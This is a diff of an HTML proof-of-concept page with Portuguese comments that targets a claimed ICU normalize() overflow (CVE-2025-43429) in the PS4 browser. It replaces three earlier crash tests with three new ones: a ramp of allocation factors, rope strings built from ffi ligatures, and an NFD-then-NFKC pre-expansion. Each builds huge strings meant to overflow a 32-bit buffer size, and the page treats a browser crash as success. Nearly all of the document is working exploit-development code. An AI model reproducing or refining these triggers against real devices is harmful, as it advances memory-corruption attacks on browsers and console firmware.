@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 ICU CVE-2025-43429 (Refined)</title>
+    <title>PS4 ICU CVE-2025-43429 (Refined Phase 3)</title>
     <style>
         body { font-family: 'Courier New', monospace; padding: 20px; background-color: #1a1a1a; color: #0f0; }
         h1 { color: #fff; border-bottom: 2px solid #555; padding-bottom: 10px; }
@@ -37,16 +37,17 @@
         }
         .error { color: #ff5555; }
         .highlight { color: #ffff55; }
+        .success { color: #55ff55; }
     </style>
 </head>
 <body>
-    <h1>CVE-2025-43429: ICU Normalize (Anti-OOM)</h1>
+    <h1>CVE-2025-43429: ICU Normalize (Phase 3)</h1>
     
     <div class="controls">
-        <p>Selecione uma estratégia de alocação. Se o navegador fechar ou travar, a vulnerabilidade foi ativada.</p>
-        <button class="danger" onclick="test218d_PreciseFactor()">Test 218d: Fator Preciso (0.24)</button>
-        <button class="danger" onclick="test218e_NativeRope()">Test 218e: Native JSC Rope (Concat)</button>
-        <button class="danger" onclick="test218f_HighExpansion()">Test 218f: Alta Expansão (Small Input)</button>
+        <p>Status: Teste D (0.24) causou pressão. Ajustando vetores.</p>
+        <button class="danger" onclick="test218g_PressureRamp()">Test 218g: Rampa de Sobrecarga (0.22 -> 0.28)</button>
+        <button class="danger" onclick="test218h_HybridRope()">Test 218h: Híbrido Rope + Expansão (ffi)</button>
+        <button class="danger" onclick="test218i_CrossNormalize()">Test 218i: Normalização Cruzada (NFD -> NFKC)</button>
         <hr style="border-color: #555;">
         <button onclick="clearLog()">Limpar Log</button>
     </div>
@@ -55,14 +56,14 @@
 
     <script>
         const log = document.getElementById('log');
-        let crashes = 0;
 
-        function addLog(msg, isError = false) {
+        function addLog(msg, type = 'normal') {
             const div = document.createElement('div');
             const time = new Date().toLocaleTimeString();
             div.textContent = `[${time}] ${msg}`;
-            if (isError) div.className = 'error';
-            if (msg.includes('Triggering')) div.className = 'highlight';
+            if (type === 'error') div.className = 'error';
+            if (type === 'highlight') div.className = 'highlight';
+            if (type === 'success') div.className = 'success';
             log.appendChild(div);
             console.log(msg);
             log.scrollTop = log.scrollHeight;
@@ -73,105 +74,139 @@
         }
 
         // =================================================================
-        // VARIAÇÃO D: Fator Preciso (0.24)
-        // Objetivo: Alocar ~480MB para ficar no limite da RAM disponível
-        // mas com tamanho lógico suficiente para estourar int32 na lib ICU.
+        // VARIAÇÃO G: Rampa de Sobrecarga (Smart Ramp)
+        // Objetivo: Se 0.24 causou pressão, o ponto de crash está próximo.
+        // Vamos testar incrementalmente para evitar OOM súbito.
         // =================================================================
-        function test218d_PreciseFactor() {
-            addLog('>>> INICIANDO TESTE 218d (Precise Factor 0.24) <<<');
-            try {
-                let len = 0x7FFFFFF0; // Alvo de overflow 32-bit
-                let numExpandChars = 16;
-                let fillLen = len - numExpandChars;
-                let expandChar = "\u00A8"; // Expande na normalização
-                let fillChar = "a";
+        function test218g_PressureRamp() {
+            addLog('>>> INICIANDO TESTE 218g (Rampa 0.22 -> 0.28) <<<', 'highlight');
+            
+            let len = 0x7FFFFFF0;
+            let expandChar = "\u00A8";
+            let fillChar = "a";
+            
+            // Começa um pouco abaixo do teste D
+            let currentFactor = 0.22;
+            const maxFactor = 0.28;
+            const step = 0.01;
+
+            async function stepTest() {
+                if (currentFactor > maxFactor) {
+                    addLog('Fim da rampa. Nenhum crash detectado.', 'success');
+                    return;
+                }
+
+                addLog(`[Passo] Testando Fator: ${currentFactor.toFixed(2)}...`);
                 
-                let compatFactor = 0.24; 
-                
-                addLog(`1. Calculando tamanhos (Fator: ${compatFactor})...`);
-                
-                // Alocação direta
-                let largeStr = expandChar.repeat(numExpandChars) + fillChar.repeat(Math.ceil(fillLen * compatFactor));
-                
-                addLog(`2. String criada na Heap (~${(largeStr.length/1024/1024).toFixed(2)} MB).`);
-                addLog(`3. EXECUTANDO normalize('NFKC')...`);
-                addLog('   (Se o console travar ou fechar agora, SUCESSO)');
-                
-                let normalized = largeStr.normalize('NFKC');
-                
-                addLog('4. Falha: O código continuou rodando (Não vulnerável ou RAM insuficiente).');
-            } catch(e) {
-                addLog('ERRO: ' + e.message, true);
-                if (e.message.includes("Out of memory")) {
-                    addLog('-> Resultado: OOM. Tente o teste 218e ou 218f.', true);
+                try {
+                    // Limpa memória anterior (tentativa)
+                    let largeStr = null; 
+                    if (window.gc) window.gc();
+
+                    let numExpandChars = 16;
+                    let fillLen = len - numExpandChars;
+                    
+                    // Alocação
+                    largeStr = expandChar.repeat(numExpandChars) + fillChar.repeat(Math.ceil(fillLen * currentFactor));
+                    
+                    addLog(`   -> Alocado (~${(largeStr.length/1024/1024).toFixed(1)} MB). Normalizando...`);
+                    
+                    // Trigger
+                    let res = largeStr.normalize('NFKC');
+                    
+                    addLog(`   -> OK (Sobreviveu). Subindo carga...`);
+                    
+                    // Libera memória explicitamente
+                    largeStr = null;
+                    res = null;
+                    
+                    currentFactor += step;
+                    setTimeout(stepTest, 500); // Pausa para GC respirar
+                    
+                } catch(e) {
+                    addLog(`ERRO no fator ${currentFactor.toFixed(2)}: ${e.message}`, 'error');
+                    if (e.message.includes("Out of memory")) {
+                        addLog('   -> OOM atingido. O ponto de crash está abaixo disso.', 'error');
+                    } else {
+                        // Se for outro erro, continuamos
+                        currentFactor += step;
+                        setTimeout(stepTest, 500);
+                    }
                 }
             }
+
+            stepTest();
         }
 
         // =================================================================
-        // VARIAÇÃO E: Native JSC Rope (Concatenação)
-        // Objetivo: Usar a otimização de "Rope" do WebKit. Strings concatenadas
-        // não ocupam memória contígua imediatamente. A memória só é exigida
-        // massivamente no momento do .normalize(), tentando driblar o OOM inicial.
+        // VARIAÇÃO H: Híbrido Rope + Expansão (Agressivo)
+        // Objetivo: Usa a concatenação (Rope) para esconder o tamanho real
+        // E usa caracteres que TRIPLICAM (ffi) para estourar o buffer na saída.
         // =================================================================
-        function test218e_NativeRope() {
-            addLog('>>> INICIANDO TESTE 218e (Native JSC Rope) <<<');
+        function test218h_HybridRope() {
+            addLog('>>> INICIANDO TESTE 218h (Híbrido Rope + Expansão) <<<', 'highlight');
             try {
-                let targetSize = 1024 * 1024 * 400; // Alvo: 400MB
-                let chunkSize = 1024 * 1024 * 10;   // Chunks de 10MB
+                // \uFB03 (ligadura ffi) -> vira 3 chars
+                let expandChar = "\uFB03"; 
                 
-                let expandChar = "\u00A8".repeat(100); 
-                let chunk = "a".repeat(chunkSize);
+                // Vamos mirar em 250MB de input (seguro) -> que viram 750MB de output (perigoso)
+                // Usando Rope para construir
+                let targetSize = 1024 * 1024 * 250; 
+                let chunkSize = 1024 * 1024 * 5; // 5MB chunks
                 
-                addLog(`1. Construindo Rope String de ${targetSize/1024/1024}MB...`);
+                addLog(`Construindo Rope de ${targetSize/1024/1024}MB (Output potencial: ${targetSize*3/1024/1024}MB)...`);
                 
-                let s = expandChar;
+                let s = "";
+                let chunk = expandChar.repeat(chunkSize);
                 let current = 0;
                 
-                // Loop de concatenação cria árvore ConsString na memória
                 while(current < targetSize) {
-                    s += chunk;
+                    s += chunk; // Cria nós ConsString
                     current += chunkSize;
                 }
                 
-                addLog('2. Rope pronta (Lazy Allocation).');
-                addLog('3. EXECUTANDO normalize(). Isso forçará o Flattening + ICU...');
+                addLog('Rope pronta. Disparando normalize (Isso deve travar)...', 'highlight');
                 
+                // O bug do ICU ocorre quando ele tenta calcular o buffer de destino
+                // para essa string "escondida" na Rope.
                 let normalized = s.normalize('NFKC');
                 
-                addLog('4. Falha: Execução continuou normalmente.');
+                addLog('Falha: Execução continuou normalmente.', 'error');
             } catch(e) {
-                addLog('ERRO: ' + e.message, true);
+                addLog('ERRO: ' + e.message, 'error');
             }
         }
 
         // =================================================================
-        // VARIAÇÃO F: Alta Expansão (Entrada Pequena -> Saída Gigante)
-        // Objetivo: Usar caracteres que triplicam de tamanho (ligaduras).
-        // Entrada de 150MB -> Saída potencial de 450MB.
-        // O estouro ocorre na escrita do buffer de destino, não na leitura.
+        // VARIAÇÃO I: Normalização Cruzada (Cross Normalize)
+        // Objetivo: Pré-expandir a string na memória usando 'NFD' (Decomposition)
+        // Isso muda a estrutura interna da string antes de jogar no 'NFKC' vulnerável.
         // =================================================================
-        function test218f_HighExpansion() {
-            addLog('>>> INICIANDO TESTE 218f (High Expansion) <<<');
+        function test218i_CrossNormalize() {
+            addLog('>>> INICIANDO TESTE 218i (Normalização Cruzada) <<<', 'highlight');
             try {
-                // \uFB03 (ligadura ffi) normaliza para "ffi" (3 chars)
-                let expandChar = "\uFB03"; 
+                // Caractere que expande em NFD: \u00C4 (Ä) -> A + ¨ (2 chars)
+                let char = "\u00C4"; 
                 
-                // String de entrada relativamente leve para o PS4 (150MB)
-                let size = 1024 * 1024 * 150; 
+                // Tamanho moderado: 200MB
+                let size = 1024 * 1024 * 200;
                 
-                addLog(`1. Alocando Input (${size/1024/1024} MB)...`);
+                addLog(`Alocando string base (${size/1024/1024} MB)...`);
+                let base = char.repeat(size);
                 
-                let s = expandChar.repeat(size);
+                addLog('1. Executando Pré-normalização (NFD)...');
+                // Isso dobra o tamanho na memória e altera o layout do buffer
+                let nfd = base.normalize('NFD');
                 
-                addLog(`2. Input pronto. Potencial Output: ~${(size*3)/1024/1024} MB.`);
-                addLog('3. EXECUTANDO normalize()...');
+                addLog(`   -> Tamanho expandido: ${(nfd.length/1024/1024).toFixed(1)} M chars.`);
+                addLog('2. Executando Trigger (NFKC) na string expandida...', 'highlight');
                 
-                let normalized = s.normalize('NFKC');
+                // Aqui atacamos com uma string que já sofreu mutação interna
+                let res = nfd.normalize('NFKC');
                 
-                addLog('4. Falha: Execução continuou normalmente.');
+                addLog('Falha: Execução continuou normalmente.', 'error');
             } catch(e) {
-                addLog('ERRO: ' + e.message, true);
+                addLog('ERRO: ' + e.message, 'error');
             }
         }
     </script>
